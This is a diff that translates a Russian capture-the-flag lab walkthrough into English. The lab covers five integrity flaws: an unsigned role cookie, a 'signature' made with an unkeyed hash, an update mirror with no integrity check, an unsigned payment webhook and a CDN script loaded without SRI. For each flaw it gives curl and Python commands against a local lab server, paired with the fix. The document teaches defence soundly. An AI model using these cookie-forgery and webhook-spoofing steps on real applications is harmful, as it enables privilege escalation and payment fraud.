@@ -1,12 +1,12 @@
-🌐 **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)
+🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)
 
-# A08 — Разбор решения (спойлеры)
+# A08 — Solution walkthrough (spoilers)
 
-Примеры: `curl` на `http://127.0.0.1:8071` (vulnerable) и короткие однострочники на Python для кодирования данных. В Windows удобнее Git Bash или WSL.
+Examples: `curl` against `http://127.0.0.1:8071` (vulnerable) and short Python one-liners for encoding data. On Windows, Git Bash or WSL is more convenient.
 
-## Дефект 1 — состояние пользователя в cookie без подписи
+## Defect 1 — user state in a cookie without a signature
 
-После входа сервер выдаёт cookie `a08v_profile` — это просто `base64url({"user":"alice","role":"user"})`. Сервер при каждом запросе читает роль из неё.
+After login the server issues the `a08v_profile` cookie — it is simply `base64url({"user":"alice","role":"user"})`. On every request the server reads the role from it.
 
 ```bash
 FORGED=$(python3 -c "import base64,json;print(base64.urlsafe_b64encode(json.dumps({'user':'alice','role':'admin'}).encode()).decode().rstrip('='))")
@@ -14,15 +14,15 @@ curl -s -b "a08v_profile=$FORGED" http://127.0.0.1:8071/admin
 # {"flag": "FLAG{a08_unsigned_profile_cookie}", "ok": true}
 ```
 
-**Правило:** всё, что хранится у клиента, клиент может изменить. Доверенное состояние держим на сервере или подписываем.
+**Rule:** anything stored on the client can be changed by the client. Keep trusted state on the server or sign it.
 
-**Fix:** cookie подписана HMAC-SHA256 с секретом сервера, а роль вообще не берётся из токена — она читается из серверного хранилища (`# FIX 1`).
+**Fix:** the cookie is signed with HMAC-SHA256 using the server's secret, and the role is not taken from the token at all — it is read from server-side storage (`# FIX 1`).
 
-> Про десериализацию: в реальных приложениях то же самое случается с `pickle`, Java-сериализацией, `unserialize()` в PHP и т.п. — там подмена данных может привести к выполнению кода. В лабу такие эксплойты намеренно не включены: для урока достаточно подмены данных. Правило то же — не десериализовать недоверенные данные и использовать простые форматы (JSON) вместе с подписью.
+> About deserialization: in real applications the same thing happens with `pickle`, Java serialization, PHP `unserialize()` and the like — there, swapping the data can lead to code execution. Such exploits are deliberately not included in the lab: swapping the data is enough for the lesson. The rule is the same — do not deserialize untrusted data, and use simple formats (JSON) together with a signature.
 
-## Дефект 2 — «подпись» без секретного ключа
+## Defect 2 — a "signature" without a secret key
 
-Cookie `a08v_license` = `base64url(json).sha256hex(json)`. Звучит как подпись, но SHA-256 — это просто хеш: посчитать его может кто угодно.
+The `a08v_license` cookie = `base64url(json).sha256hex(json)`. It sounds like a signature, but SHA-256 is just a hash: anyone can compute it.
 
 ```bash
 curl -s -c j.txt -X POST http://127.0.0.1:8071/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
@@ -37,27 +37,27 @@ curl -s -b "a08v_profile=$PROFILE; a08v_license=$FORGED" http://127.0.0.1:8071/p
 # {"flag": "FLAG{a08_unkeyed_hash_is_not_a_signature}", "ok": true}
 ```
 
-**Правило:** хеш защищает от случайной порчи, но не от злоумышленника. Против него нужен MAC с секретом (HMAC) или цифровая подпись.
+**Rule:** a hash protects against accidental corruption, but not against an attacker. Against an attacker you need a MAC with a secret (HMAC) or a digital signature.
 
-**Fix:** `hmac.new(SECRET, data, sha256)` + `hmac.compare_digest`; лицензия привязана к пользователю (`# FIX 2`).
+**Fix:** `hmac.new(SECRET, data, sha256)` + `hmac.compare_digest`; the license is bound to the user (`# FIX 2`).
 
-## Дефект 3 — обновление без проверки целостности
+## Defect 3 — an update without an integrity check
 
-Зеркало «взломано» — атакующий опубликовал в пакете `theme-pack` лишнее поле `payout_account`:
+The mirror is "hacked" — the attacker has published an extra field `payout_account` in the `theme-pack` package:
 
 ```bash
 curl -s -X POST http://127.0.0.1:8071/mirror/publish -H 'Content-Type: application/json' \
   -d '{"package":"theme-pack","version":"1.2","content":{"theme":"dark","payout_account":"ATTACKER-IBAN-6666"}}'
 curl -s -X POST http://127.0.0.1:8071/system/run-update
 curl -s http://127.0.0.1:8071/settings
-# payout_account изменён; в ответе флаг FLAG{a08_update_without_integrity_check}
+# payout_account has changed; the response contains the flag FLAG{a08_update_without_integrity_check}
 ```
 
-Ровно так работают атаки на цепочку поставок: доверие к источнику («это же наше зеркало») вместо проверки содержимого.
+This is exactly how supply chain attacks work: trust in the source ("it is our mirror") instead of checking the content.
 
-**Fix** (`# FIX 3`): «lock-файл» с закреплённым хешем каждого пакета, сравнение через `compare_digest`, отказ для пакета не из lock-файла, плюс белый список полей, которые пакет вообще может менять. Тот же принцип в реальном мире: `package-lock.json` с `integrity`, `pip install --require-hashes`, подпись артефактов (Sigstore/cosign), закреплённые дайджесты образов Docker.
+**Fix** (`# FIX 3`): a "lock file" with a pinned hash of every package, comparison with `compare_digest`, refusal for a package that is not in the lock file, plus an allow list of the fields that a package may change at all. The same principle in the real world: `package-lock.json` with `integrity`, `pip install --require-hashes`, artifact signing (Sigstore/cosign), pinned Docker image digests.
 
-## Дефект 4 — webhook без подписи
+## Defect 4 — a webhook without a signature
 
 ```bash
 curl -s -c j.txt -X POST http://127.0.0.1:8071/login -H 'Content-Type: application/json' -d '{"username":"alice","password":"alice123"}'
@@ -67,9 +67,9 @@ curl -s -b j.txt http://127.0.0.1:8071/orders/1001
 # status: paid, download_key: FLAG{a08_unsigned_webhook}
 ```
 
-**Fix** (`# FIX 4`): провайдер подписывает `timestamp.тело` общим секретом (`X-Signature: sha256=...`, `X-Timestamp`). Сервер проверяет подпись, свежесть метки (±5 минут), что эта подпись ещё не использовалась (replay), и что сумма и состояние заказа совпадают.
+**Fix** (`# FIX 4`): the provider signs `timestamp.body` with a shared secret (`X-Signature: sha256=...`, `X-Timestamp`). The server checks the signature, the freshness of the timestamp (±5 minutes), that this signature has not been used before (replay), and that the amount and the order state match.
 
-Как выглядит корректная отправка в fixed (так делает настоящий провайдер, знающий секрет):
+What a correct request to fixed looks like (this is what a real provider that knows the secret does):
 
 ```python
 import hashlib, hmac, json, time, requests
@@ -79,23 +79,23 @@ ts = str(int(time.time()))
 sig = "sha256=" + hmac.new(secret, ts.encode() + b"." + body, hashlib.sha256).hexdigest()
 r = requests.post("http://127.0.0.1:8072/webhook/payment", data=body,
                   headers={"X-Timestamp": ts, "X-Signature": sig, "Content-Type": "application/json"})
-print(r.status_code, r.text)   # 200; повтор того же запроса -> 409; изменённое тело -> 401
+print(r.status_code, r.text)   # 200; repeating the same request -> 409; a changed body -> 401
 ```
 
-Атакующий секрета не знает, поэтому без него сделать валидную подпись не может.
+The attacker does not know the secret, so without it they cannot make a valid signature.
 
-## Дефект 5 — сторонний скрипт без SRI
+## Defect 5 — a third-party script without SRI
 
-1. Откройте `http://127.0.0.1:8071/donate`: видите легитимные реквизиты `LAB-IBAN-0001-LEGIT`.
-2. Выполните `curl -X POST http://127.0.0.1:8071/cdn/compromise` и обновите страницу: теперь там `ATTACKER-IBAN-6666`. Страница не менялась, но подгружаемый скрипт — да.
+1. Open `http://127.0.0.1:8071/donate`: you see the legitimate payment details `LAB-IBAN-0001-LEGIT`.
+2. Run `curl -X POST http://127.0.0.1:8071/cdn/compromise` and refresh the page: now it shows `ATTACKER-IBAN-6666`. The page did not change, but the script it loads did.
 
-**Fix** (`# FIX 5`, страница `http://127.0.0.1:8072/donate`):
+**Fix** (`# FIX 5`, the page `http://127.0.0.1:8072/donate`):
 
 ```html
 <script src="/cdn/widget.js" integrity="sha384-..." crossorigin="anonymous"></script>
 ```
 
-Браузер сравнивает хеш полученного файла с `integrity` и просто не выполняет скрипт, если они не совпали. Повторите шаги на 8072: после `POST /cdn/compromise` реквизиты остаются «загрузка…», а в консоли браузера появляется ошибка проверки целостности. SRI защищает от подмены файла на CDN, но не от вредоносной версии, которую вы сами закрепили, — поэтому хеши берут из проверенной сборки.
+The browser compares the hash of the received file with `integrity` and simply does not run the script if they do not match. Repeat the steps on 8072: after `POST /cdn/compromise` the payment details stay as "загрузка…" (loading…), and an integrity check error appears in the browser console. SRI protects against a file being swapped on the CDN, but not against a malicious version that you pinned yourself — which is why the hashes are taken from a verified build.
 
-## Итог
-Общее у всех пяти дефектов: сервер или браузер **верит данным по их происхождению** («это же наша cookie / наше зеркало / наш платёжный провайдер / наш CDN»), а не **проверяет их подлинность**. Исправление везде одинаковое по смыслу: подпись или закреплённый хеш, секрет, которого нет у атакующего, проверка свежести и ограничение того, что даже доверенные данные могут изменить.
+## Summary
+What all five defects have in common: the server or the browser **trusts data by its origin** ("it is our cookie / our mirror / our payment provider / our CDN") instead of **verifying its authenticity**. The fix is the same in meaning everywhere: a signature or a pinned hash, a secret that the attacker does not have, a freshness check and a limit on what even trusted data may change.
